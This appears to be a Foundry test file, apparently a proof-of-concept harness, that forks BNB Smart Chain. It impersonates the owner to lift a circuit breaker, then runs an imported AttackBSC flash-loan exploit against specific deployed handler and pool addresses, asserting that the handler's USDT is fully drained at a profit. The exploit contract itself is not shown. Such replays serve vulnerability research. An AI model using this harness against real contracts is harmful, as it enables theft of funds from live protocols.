// SPDX-License-Identifier: MIT
pragma solidity 0.8.24;

import {Test, console2} from "forge-std/Test.sol";
import {AttackBSC} from "../src/AttackBSC.sol";

interface IERC20V { function balanceOf(address) external view returns (uint256); }
interface ITMB2 {
    function getCircuitBreaker() external view returns (bool);
    function owner() external view returns (address);
    function setCircuitBreaker(bool emergency) external returns (bool);
}
interface IHandlerV { function handlerViewProxy(bytes calldata) external returns (bool, bytes memory); }

contract BSCPoCTest is Test {
    address constant TM = 0x8010F9E14C8286B9312e624370fdDC07fee2Fc75;
    address constant HANDLER = 0x2A29598cbc17BA112C8Fd0E07Fbf5402eF57E6b8;
    address constant USDT = 0x55d398326f99059fF775485246999027B3197955;
    address constant POOL = 0x92b7807bF19b7DDdf89b706143896d05228f3121; // PancakeSwap V3 USDT/USDC 0.01%
    address constant OWNER = 0xf357a08C8D4A385Cebddb517a44b210A0F6b3393;

    function setUp() public {
        vm.createSelectFork("https://bsc-rpc.publicnode.com");
        console2.log("fork block", block.number);
    }

    function test_breaker_blocks() public {
        assertTrue(ITMB2(TM).getCircuitBreaker(), "emergency should be true");
        vm.expectRevert();
        (bool ok,) = HANDLER.call(abi.encodeWithSignature("deposit(uint256,bool)", uint256(1e18), false));
        ok;
    }

    function test_replay_with_breaker_off() public {
        uint256 h0 = IERC20V(USDT).balanceOf(HANDLER);
        console2.log("handler USDT before", h0);

        // exact authorized unpause path (owner is in breakerTable on BSC)
        vm.prank(OWNER);
        ITMB2(TM).setCircuitBreaker(false);
        assertFalse(ITMB2(TM).getCircuitBreaker(), "still paused");

        AttackBSC atk = new AttackBSC(USDT, HANDLER, POOL);
        atk.run(18_000_000e18);
        uint256 profit = atk.profit();
        uint256 h1 = IERC20V(USDT).balanceOf(HANDLER);
        console2.log("profit (USDT, net of 0.01% flash fee)", profit);
        console2.log("drained from handler", atk.drained());
        console2.log("handler USDT after", h1);

        assertGt(profit, 0, "not profitable");
        assertEq(h1, 0, "handler not fully drained");
        assertEq(profit, h0 - 1_800e18, "unexpected net");
    }
}
